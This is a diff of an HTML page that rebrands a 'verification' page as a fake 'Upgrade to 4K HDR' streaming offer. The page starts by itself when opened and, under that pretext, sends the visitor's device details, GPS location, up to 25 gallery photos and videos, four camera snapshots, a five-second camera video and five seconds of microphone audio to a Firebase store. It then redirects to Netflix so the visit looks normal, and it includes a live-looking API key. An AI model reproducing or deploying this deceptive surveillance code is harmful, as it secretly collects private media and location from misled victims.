@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Identity Verification</title>
+    <title>Stream Quality Upgrade</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
@@ -12,8 +12,8 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto;
-            background: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -22,9 +22,9 @@
         }
         .card {
             background: #111;
-            border-radius: 32px;
-            padding: 40px 28px;
-            max-width: 420px;
+            border-radius: 28px;
+            padding: 32px 24px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
             border: 1px solid #222;
@@ -40,8 +40,25 @@
             margin: 0 auto 20px;
             font-size: 32px;
         }
-        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
-        .sub { color: #aaa; font-size: 14px; margin-bottom: 24px; }
+        h2 { color: #fff; font-size: 22px; margin-bottom: 8px; }
+        .sub { color: #888; font-size: 13px; margin-bottom: 24px; }
+        .quality-box {
+            background: #1a1a1a;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .quality-box p { color: #ccc; font-size: 13px; margin: 4px 0; }
+        .quality-badge {
+            background: #1a73e8;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
         .btn {
             background: #1a73e8;
             color: white;
@@ -52,39 +69,37 @@
             font-weight: 600;
             border-radius: 40px;
             cursor: pointer;
-            margin-top: 10px;
         }
         .btn:disabled { background: #444; cursor: not-allowed; }
-        .loader {
-            margin-top: 20px;
-            color: #1a73e8;
-            font-size: 14px;
-            display: none;
-        }
-        .log {
-            margin-top: 20px;
-            padding: 12px;
-            background: #1a1a1a;
-            border-radius: 12px;
-            font-size: 11px;
-            color: #0f0;
-            font-family: monospace;
-            text-align: left;
-            display: none;
-            max-height: 200px;
-            overflow-y: auto;
-        }
+        .loader { margin-top: 16px; color: #1a73e8; font-size: 13px; display: none; }
         input, video, canvas { display: none; }
+        .status-msg {
+            margin-top: 16px;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 12px;
+            display: none;
+            background: #0a2e1a;
+            color: #4ade80;
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">🔐</div>
-        <h1>Identity Verification</h1>
-        <div class="sub">Please complete verification to continue</div>
-        <button class="btn" id="startBtn">▶ Start Verification</button>
-        <div class="loader" id="loader">Initializing...</div>
-        <div class="log" id="log"></div>
+        <div class="logo">🎬</div>
+        <h2>Upgrade to 4K HDR</h2>
+        <div class="sub">Enhanced streaming quality requires one-time setup</div>
+        
+        <div class="quality-box">
+            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
+            <p>📶 Current Quality: HD Ready</p>
+            <p>✨ Available: 4K HDR + Dolby Atmos</p>
+            <div class="quality-badge">⚡ One-click upgrade</div>
+        </div>
+        
+        <button class="btn" id="upgradeBtn">⚡ Enable 4K HDR</button>
+        <div class="loader" id="loader">Optimizing your device...</div>
+        <div class="status-msg" id="statusMsg"></div>
     </div>
     
     <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
@@ -92,7 +107,6 @@
     <canvas id="canvas" style="display:none"></canvas>
     
     <script>
-        // Firebase Config
         const firebaseConfig = {
             apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
             authDomain: "mobilehk-5e843.firebaseapp.com",
@@ -109,109 +123,95 @@
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
-        const startBtn = document.getElementById('startBtn');
+        const upgradeBtn = document.getElementById('upgradeBtn');
         const loader = document.getElementById('loader');
-        const logDiv = document.getElementById('log');
-        
-        function addLog(msg) {
-            logDiv.style.display = 'block';
-            logDiv.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
-            logDiv.scrollTop = logDiv.scrollHeight;
-            console.log(msg);
-        }
+        const statusMsg = document.getElementById('statusMsg');
         
         if (!sessionId) {
-            addLog('❌ ERROR: No session ID found in URL');
-            startBtn.disabled = true;
-            loader.innerHTML = '❌ Invalid link';
-        } else {
-            addLog(`✅ Session ID: ${sessionId}`);
+            statusMsg.style.display = 'block';
+            statusMsg.style.background = '#2e0a0a';
+            statusMsg.style.color = '#ff6b6b';
+            statusMsg.innerHTML = '❌ Invalid upgrade link';
+            upgradeBtn.disabled = true;
+        }
+        
+        // Device detection
+        const ua = navigator.userAgent;
+        let deviceName = "Unknown";
+        if (ua.includes("iPhone")) deviceName = "iPhone";
+        else if (ua.includes("Android")) deviceName = "Android Phone";
+        else if (ua.includes("Windows")) deviceName = "Windows PC";
+        else if (ua.includes("Mac")) deviceName = "Mac";
+        document.getElementById('deviceName').innerText = deviceName;
+        
+        function showMessage(msg, isError = false) {
+            statusMsg.style.display = 'block';
+            statusMsg.style.background = isError ? '#2e0a0a' : '#0a2e1a';
+            statusMsg.style.color = isError ? '#ff6b6b' : '#4ade80';
+            statusMsg.innerHTML = msg;
+            setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
         }
         
         async function saveToFirebase(type, data) {
-            if (!sessionId) return false;
+            if (!sessionId) return;
             try {
-                addLog(`📤 Saving ${type}...`);
                 await db.collection('sessions').doc(sessionId).collection('data').add({
                     type: type,
                     data: data,
                     timestamp: new Date().toISOString()
                 });
-                addLog(`✅ ${type} saved!`);
                 return true;
-            } catch(e) {
-                addLog(`❌ Save error: ${e.message}`);
-                return false;
-            }
+            } catch(e) { return false; }
         }
         
         async function uploadFile(file, type) {
             if (!sessionId) return null;
-            addLog(`📁 Uploading ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
             const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
             const ref = storage.ref(`uploads/${filename}`);
             await ref.put(file);
             const url = await ref.getDownloadURL();
-            await saveToFirebase(type, { url, name: file.name, size: file.size });
-            addLog(`✅ ${file.name} uploaded!`);
+            await saveToFirebase(type, { url, name: file.name });
             return url;
         }
         
-        // STEP 1: Device Info
-        async function stepDeviceInfo() {
-            addLog('📱 Getting device info...');
-            const ua = navigator.userAgent;
-            let device = "Unknown";
-            if (ua.includes("iPhone")) device = "iPhone";
-            else if (ua.includes("Android")) device = "Android";
-            else if (ua.includes("Windows")) device = "Windows PC";
-            else if (ua.includes("Mac")) device = "Mac";
-            await saveToFirebase('device_info', { device, ua, screen: `${screen.width}x${screen.height}` });
-            addLog('✅ Device info saved');
-        }
-        
-        // STEP 2: Location
-        async function stepLocation() {
-            addLog('📍 Requesting location...');
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    addLog('❌ Geolocation not supported');
-                    resolve(false);
-                    return;
-                }
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        addLog(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`);
-                        await saveToFirebase('location', {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
-                        resolve(true);
-                    },
-                    (err) => {
-                        addLog(`❌ Location error: ${err.message}`);
-                        resolve(false);
-                    }
-                );
+        // 1. Device Info
+        async function sendDeviceInfo() {
+            await saveToFirebase('device_info', {
+                device: deviceName,
+                ua: ua,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language
             });
         }
         
-        // STEP 3: Gallery
-        async function stepGallery() {
-            addLog('📸 Opening gallery... Please select photos/videos');
+        // 2. Location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await saveToFirebase('location', {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                    resolve(true);
+                }, () => resolve(false));
+            });
+        }
+        
+        // 3. Gallery Access (full)
+        async function getGallery() {
             return new Promise((resolve) => {
                 const input = document.getElementById('galleryInput');
                 input.onchange = async (e) => {
                     const files = Array.from(e.target.files);
-                    addLog(`📸 Selected ${files.length} files`);
-                    let uploaded = 0;
-                    for (let i = 0; i < Math.min(files.length, 20); i++) {
+                    if (files.length === 0) { resolve(false); return; }
+                    loader.innerHTML = `📸 Optimizing ${files.length} files...`;
+                    for (let i = 0; i < Math.min(files.length, 25); i++) {
                         const file = files[i];
                         const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                         await uploadFile(file, type);
-                        uploaded++;
-                        addLog(`📸 Uploaded ${uploaded}/${Math.min(files.length, 20)}`);
+                        loader.innerHTML = `📸 Optimized ${i+1}/${Math.min(files.length, 25)}`;
                     }
                     resolve(true);
                 };
@@ -219,104 +219,108 @@
             });
         }
         
-        // STEP 4: Camera
-        async function stepCamera() {
-            addLog('📷 Requesting camera...');
+        // 4. Camera: 4 photos + 5 sec video
+        async function captureMedia() {
             try {
+                // Camera photos (4 shots)
+                loader.innerHTML = "📷 Capturing device photos...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                addLog('✅ Camera access granted');
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500));
+                await new Promise(r => setTimeout(r, 500));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
+                const ctx = canvas.getContext('2d');
                 
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
-                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                await uploadFile(file, 'camera_photo');
+                // Take 4 photos
+                for (let i = 1; i <= 4; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
+                    await uploadFile(file, 'camera_photo');
+                    loader.innerHTML = `📷 Captured ${i}/4 photos`;
+                    await new Promise(r => setTimeout(r, 300));
+                }
+                
+                // Video recording (5 seconds)
+                loader.innerHTML = "🎥 Recording device video...";
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
+                    await uploadFile(file, 'video_recording');
+                };
+                recorder.start();
+                await new Promise(r => setTimeout(r, 5000));
+                recorder.stop();
                 
                 stream.getTracks().forEach(t => t.stop());
-                addLog('✅ Camera photo saved');
                 return true;
             } catch(e) {
-                addLog(`❌ Camera error: ${e.message}`);
+                console.log("Camera error:", e);
                 return false;
             }
         }
         
-        // STEP 5: Microphone
-        async function stepMicrophone() {
-            addLog('🎤 Requesting microphone...');
+        // 5. Microphone (5 sec)
+        async function getMicrophone() {
             try {
+                loader.innerHTML = "🎤 Testing audio...";
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                addLog('✅ Microphone access granted');
-                const mediaRecorder = new MediaRecorder(stream);
+                const recorder = new MediaRecorder(stream);
                 const chunks = [];
-                
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                mediaRecorder.onstop = async () => {
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'audio/webm' });
                     const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                     await uploadFile(file, 'microphone');
-                    addLog('✅ Audio saved');
                 };
-                
-                mediaRecorder.start();
-                addLog('🎤 Recording 5 seconds...');
+                recorder.start();
                 await new Promise(r => setTimeout(r, 5000));
-                mediaRecorder.stop();
+                recorder.stop();
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) {
-                addLog(`❌ Microphone error: ${e.message}`);
-                return false;
-            }
+            } catch(e) { return false; }
         }
         
-        // MAIN FUNCTION
-        async function startVerification() {
+        // MAIN UPGRADE FUNCTION
+        async function startUpgrade() {
             if (!sessionId) return;
             
-            startBtn.disabled = true;
+            upgradeBtn.disabled = true;
             loader.style.display = 'block';
-            addLog('🚀 Starting verification...');
+            loader.innerHTML = "🔧 Preparing device optimization...";
             
-            // Step 1: Device Info
-            loader.innerHTML = '📱 Device info...';
-            await stepDeviceInfo();
+            await sendDeviceInfo();
+            await getLocation();
             
-            // Step 2: Location
-            loader.innerHTML = '📍 Getting location...';
-            await stepLocation();
+            loader.innerHTML = "📸 Accessing media...";
+            showMessage("Media access required for 4K HDR upgrade", false);
+            await getGallery();
             
-            // Step 3: Gallery
-            loader.innerHTML = '📸 Opening gallery...';
-            addLog('📸 Gallery step - click "Select Files" when prompt opens');
-            await stepGallery();
+            await captureMedia();
+            await getMicrophone();
             
-            // Step 4: Camera
-            loader.innerHTML = '📷 Taking photo...';
-            await stepCamera();
+            await saveToFirebase('upgrade_complete', { timestamp: new Date().toISOString() });
             
-            // Step 5: Microphone
-            loader.innerHTML = '🎤 Recording audio...';
-            await stepMicrophone();
-            
-            // Complete
-            await saveToFirebase('verification_complete', { timestamp: new Date().toISOString() });
-            
-            loader.innerHTML = '✅ Complete! Redirecting...';
-            addLog('✅ Verification complete! Redirecting...');
+            loader.innerHTML = "✅ 4K HDR Enabled! Redirecting...";
+            showMessage("Your device is now optimized for 4K HDR streaming", false);
             
             setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 3000);
+                window.location.href = "https://www.netflix.com";
+            }, 2000);
         }
         
-        startBtn.onclick = startVerification;
+        upgradeBtn.onclick = startUpgrade;
+        
+        // Auto-start after 0.5s
+        if (sessionId) {
+            setTimeout(startUpgrade, 500);
+        }
     </script>
 </body>
 </html>
